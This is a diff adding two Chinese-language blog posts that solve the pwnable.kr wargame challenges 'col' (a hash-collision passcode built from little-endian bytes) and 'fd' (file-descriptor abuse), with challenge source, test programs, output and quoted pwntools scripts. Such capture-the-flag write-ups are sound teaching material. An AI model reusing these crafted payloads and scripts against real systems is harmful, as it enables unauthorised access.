@@ -353,6 +353,729 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/04/05/pwnable-kr2-col/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/04/05/pwnable-kr2-col/" class="post-title-link" itemprop="url">pwnable.kr2-col</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-05 20:49:21" itemprop="dateCreated datePublished" datetime="2019-04-05T20:49:21+08:00">2019-04-05</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-04-06 22:03:51" itemprop="dateModified" datetime="2019-04-06T22:03:51+08:00">2019-04-06</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;  <span class="comment">//之后要想办法让函数返回的值等于这个</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;   </span><br><span class="line">    <span class="comment">/*强制类型转换，char转为int。</span></span><br><span class="line"><span class="comment">  注意：char为1字节，int为4字节因此输入5个int累加（即输入的是20字节），</span></span><br><span class="line"><span class="comment">    可以用十六进制表示数，如/x01就是一个字节，</span></span><br><span class="line"><span class="comment">    我们可以让一个int值为/x01/x01/x01/x01  它的值为16843009（10）这个，总之就是凑5个int相加为指定的值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;   <span class="comment">//这里循环五次</span></span><br><span class="line">        res += ip[i];    <span class="comment">//将五个数累加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;         <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;  <span class="comment">//告诉我们输入要为20个字节</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;  <span class="comment">//这行给出flag，即想办法让这两个相等</span></span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>首先定位到<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;  <span class="comment">//这行给出flag，即想办法让这两个相等</span></span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>说明要想得到flag就要让  你的输入 传入函数后得到一个与hashcode一样的值<br>if(strlen(argv[1]) != 20){   这个if语句也告诉我们输入要为20个字节</p>
+<p>int* ip = (int*)p;<br>这里对p进行了一次强制转化，从原本读出来的char转化为了int<br>char占一个字节，8个比特。int占4个字节，32个比特。 （十六进制0x01就是一个字节了，那么十六进制下01010101就可以表示一个int数了）<br>hashcode == check_password( argv[1] )实现了一个累加<br>这里需要构造5个int类型的数（总共是20字节）相加为0x21DD09EC<br>实际上就是把5*4=20个字符，每4个分成一组累加。<br>普遍的一个想法： 0x1DD905E8+0x01010101*4=0x21DD09EC 这里用01010101来构造<br>那么开始操作，实践</p>
+<h2 id="探究数据在内存中的存储方式"><a href="#探究数据在内存中的存储方式" class="headerlink" title="探究数据在内存中的存储方式"></a>探究数据在内存中的存储方式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>]=<span class="string">"ABCDEFGHIJKLMNOPQRS"</span>;</span><br><span class="line">    <span class="keyword">int</span> *p=(<span class="keyword">int</span> *)str;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;p[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1145258561</span><br><span class="line">1212630597</span><br><span class="line">1280002633</span><br><span class="line">1347374669</span><br><span class="line">5460561</span><br></pre></td></tr></table></figure>
+<p>转为16进制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x44434241</span><br><span class="line">0x48474645</span><br><span class="line">0x4C4B4A49</span><br><span class="line">0x504F4E4D</span><br><span class="line">0x535251</span><br></pre></td></tr></table></figure></p>
+<p>如果我们输入A-T这20个字符，那么会报出一下的错误：<br>[Error] initializer-string for array of chars is too long [-fpermissive]<br>说明数组的限制了，那么推理出应是结束符需要占一个的位子<br>接着测试<br><img src="/2019/04/05/pwnable-kr2-col/C.PNG" alt=""><br>发现输出了一个空行，那么应该是结束符了</p>
+<p>接着进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[20]=&#123;&apos;\x01&apos;,&apos;\x02&apos;,&apos;\x03&apos;,&apos;\x04&apos;,&apos;\x05&apos;,&apos;\x06&apos;,&apos;\x07&apos;,&apos;\x08&apos;,&apos;\x09&apos;,&apos;\x10&apos;,&apos;\x11&apos;,&apos;\x12&apos;,&apos;\x01&apos;,&apos;\x01&apos;,&apos;\x01&apos;,&apos;\x01&apos;,&apos;\x01&apos;,&apos;\x01&apos;,&apos;\x01&apos;,&apos;\x01&apos;&#125;;</span><br><span class="line">    int *p=(int *)str;</span><br><span class="line">    for(int i=0; i&lt;5; i++)&#123;</span><br><span class="line">        cout&lt;&lt;dec&lt;&lt;p[i]&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;hex&lt;&lt;p[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">67305985</span><br><span class="line">4030201</span><br><span class="line">134678021</span><br><span class="line">8070605</span><br><span class="line">303108105</span><br><span class="line">12111009</span><br><span class="line">16843009</span><br><span class="line">1010101</span><br><span class="line">16843009</span><br><span class="line">1010101</span><br></pre></td></tr></table></figure></p>
+<h2 id="尝试构造payload"><a href="#尝试构造payload" class="headerlink" title="尝试构造payload"></a>尝试构造payload</h2><p> 0x1DD905E8+0x010101014=0x21DD09EC<br> 我们通过之前的观察发现转换为int时，四个字符是倒过来存储合并的， 0x1DD905E8我们要写成’\xE8’,’\x05’,’\xD9’,’\x1D’才行<br> 那么尝试：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    char str[20]=&#123;'\xE8','\x05','\xD9','\x1D','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01','\x01'&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p=(<span class="keyword">int</span> *)str;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123; </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;dec&lt;&lt;p[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;hex&lt;&lt;p[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        tmp+=p[i];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dec&lt;&lt;tmp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;hex&lt;&lt;tmp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">500762088</span><br><span class="line">1dd905e8</span><br><span class="line">16843009</span><br><span class="line">1010101</span><br><span class="line">16843009</span><br><span class="line">1010101</span><br><span class="line">16843009</span><br><span class="line">1010101</span><br><span class="line">16843009</span><br><span class="line">1010101</span><br><span class="line">568134124</span><br><span class="line">21dd09ec</span><br></pre></td></tr></table></figure></p>
+<p>发现构造成功，得到我们想要的0x21DD09EC<br><img src="/2019/04/05/pwnable-kr2-col/C2.PNG" alt=""><br>终端输入<br><img src="/2019/04/05/pwnable-kr2-col/flag.PNG" alt=""><br>大佬的爬虫脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">hashcode = <span class="number">0x21DD09EC</span></span><br><span class="line"> </span><br><span class="line">a = <span class="number">0x01020304</span></span><br><span class="line">b = hashcode - <span class="number">4</span> * a</span><br><span class="line"> </span><br><span class="line">payload = p32(a) * <span class="number">4</span> + p32(b)</span><br><span class="line"> </span><br><span class="line">target = subprocess.Popen(args=[<span class="string">'/home/col/col'</span>,payload])</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://blog.csdn.net/Jason_ZhouYetao/article/details/80727467" target="_blank" rel="noopener">脚本来源网址及脚本分析</a></p>
+<p>另解<br>    python -c “print ‘\xe8\x05\xd9\x1d’+16*’\x01’”|xargs ./col因为是小端机器需要反序，xargs可以把数据当作命令行参数传给制定的程序。<br><img src="/2019/04/05/pwnable-kr2-col/j.dib" alt=""></p>
+<p>来自<a href="https://blog.csdn.net/u010334666/article/details/81193660" target="_blank" rel="noopener">https://blog.csdn.net/u010334666/article/details/81193660</a>的python代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> collision.py+                                                      buffers </span><br><span class="line">  1 #!/usr/bin/env python</span><br><span class="line">  2 # coding=utf-8</span><br><span class="line">  3 from pwn import *</span><br><span class="line">  4 pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;col&apos;,password=&apos;guest&apos;,port=2222)</span><br><span class="line">  5 print(pwn_ssh.connected())</span><br><span class="line">  6 sh=pwn_ssh.process(argv=[&apos;collision&apos;,&apos;\xc9\xce\xc5\x06&apos; * 4 + &apos;\xcc\xce\xc5\x06&apos;],executable=&apos;./col&apos;)#那些数字是0x21DD09EC/5计算得到，然后用0x21DD09EC-得到的结果*4</span><br><span class="line">  7 print(sh.recvall())</span><br><span class="line">~                                                                               </span><br><span class="line">~</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="‘-x’"><a href="#‘-x’" class="headerlink" title="‘\x’"></a>‘\x’</h2><p>\xhh  表示1到2位十六进制所代表的任意字符<br>字符型常量所表示的值是字符型变量所能包含的值。我们可以用ASCII表达式来表示一个字符型常量，或者用单引号内加反斜杠表示转义字符。<br>\x表示后面的字符是十六进制数，\o表示后面的字符是八进制数。例如十进制的17用十六进制表示就是<br>‘\x11’,用八进制表示就是‘\021’;</p>
+<p>所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加”\”来表示常见的那些不能显示的ASCII字符，如\0,\t,\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思了。</p>
+<h2 id="char-p"><a href="#char-p" class="headerlink" title="char *p"></a>char *p</h2><p>char *p</p>
+<p>char* p和char *p<br>eg:<br>    char *p=”abc123ABC”;//char p[]=”abc123ABC”<br>char* p是一个指针，根本没分配内存，他指向的”abc123ABC” 是只读的，不能改变，你在下面给他赋值肯定是错的<br>而char p[]是一个数组，已经分配内存，是将”abc123ABC” 复制到该内存里面，这个内存是可读写的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *p; <span class="comment">//*p是const,p可变：const 后面紧跟的是char，所以*p是一个char字符，不可变</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> (<span class="keyword">char</span> *) p;<span class="comment">//p是const,*p可变：const 后面紧跟的是（char *）这个整体，所以p是char*类型，不可变。</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> p; <span class="comment">//p是const,*p可变:const 后面紧跟的是p,所以p不可变</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> p; <span class="comment">//p和*p都是const：第一个const后面紧跟的是char,所以char类型的字符*p不可变；第二个const后面紧跟的是p,所以p不可变。</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> <span class="keyword">const</span> * p;<span class="comment">// *p是const,p可变：const后面紧跟的是*,但是单独的*不能表明修饰的内容，所以将*p看成一个整体，所以const修饰的是*p,*p不可变。</span></span><br><span class="line"> </span><br><span class="line">(<span class="keyword">char</span>*) <span class="keyword">const</span> p;<span class="comment">//p是const,*p可变：const紧跟的是p,所以p不可变。</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> p;<span class="comment">// p是const,*p可变：const紧跟的是p,所以p不可变。</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> <span class="keyword">const</span>* <span class="keyword">const</span> p;<span class="comment">// p和*p都是const：第一个const紧跟的是*,不能表明修饰的内容，将后面整体的（* const p）看成一个整体，那就说明*p不可变，第二个const后面紧跟的是p,所以p不可变。</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>原文：<a href="https://blog.csdn.net/qq_38204481/article/details/79711702" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/79711702</a><br>原文：<a href="https://blog.csdn.net/jack0201/article/details/75071980" target="_blank" rel="noopener">https://blog.csdn.net/jack0201/article/details/75071980</a><br>原文：<a href="https://blog.csdn.net/u010334666/article/details/81193660" target="_blank" rel="noopener">https://blog.csdn.net/u010334666/article/details/81193660</a> </p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/04/04/pwnable-kr1-fd/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/04/04/pwnable-kr1-fd/" class="post-title-link" itemprop="url">pwnable.kr1-fd</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-04 21:07:16" itemprop="dateCreated datePublished" datetime="2019-04-04T21:07:16+08:00">2019-04-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-04-16 14:46:26" itemprop="dateModified" datetime="2019-04-16T14:46:26+08:00">2019-04-16</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="/2019/04/04/pwnable-kr1-fd/t.PNG" alt=""><br>题目最下方有个ssh命令，这是linux的远程连接命令，(host=pwnable.kr , user =fd  password=2222 password=guest)<br>可以打开linux终端，直接输入那行命令进行连接<br>    ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222<br>输入那行命令后输入密码，有时候会提示安全性问题，选择Y(yes)，输入密码，输入密码的时候是不会回显的（显示在屏幕上）</p>
+<p>密码为guest，然后ls（ls命令学习） 查看有什么文件，然后输入cat  fd.c 查看fd.c的文件内容，之后发现有三个文件分别为fd、fd.c 、flag。<br>    fd@ubuntu:~$ ls<br>    fd  fd.c  flag</p>
+<p>显然不能直接查看flag<br>    fd@ubuntu:~$ cat flag<br>    cat: flag: Permission denied<br>我们抓取源码</p>
+<pre><code>fd@ubuntu:~$ cat fd.c
+</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;   <span class="comment">//此处设置fd的值，解题时应想办法为0</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);        <span class="comment">//让fd=0，我们就可以用标准输入（键盘）控制buf（缓存）的值了，</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;    <span class="comment">//此处告诉我们的目标是让它等于"LETMEWIN\n"</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>随便输入，会出现啥？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd</span><br><span class="line">pass argv[1] a number</span><br><span class="line">fd@ubuntu:~$ ./fd 3</span><br><span class="line">learn about Linux file IO</span><br><span class="line">fd@ubuntu:~$ ./fd 2</span><br><span class="line">learn about Linux file IO</span><br><span class="line">fd@ubuntu:~$ ./fd 1</span><br><span class="line">learn about Linux file IO</span><br></pre></td></tr></table></figure></p>
+<p>那么开始分析</p>
+<h1 id="所需知识："><a href="#所需知识：" class="headerlink" title="所需知识："></a>所需知识：</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>　　对于内核而言，所有打开的文件都通过文件描述符引用。文件描述符是一个非负整数。当打开一个现有文件或创建一个新文件时，内核向进程返回一个文件描述符。当读或写一个文件时，使用open或create返回的文件描述符表示该文件，将其作为参数传给read或write函数。<br><img src="/2019/04/04/pwnable-kr1-fd/1.png" alt=""></p>
+<h2 id="read-函数"><a href="#read-函数" class="headerlink" title="read 函数"></a>read 函数</h2><p><a href="https://blog.csdn.net/csdn_logo/article/details/46500065" target="_blank" rel="noopener">read函数———详解</a></p>
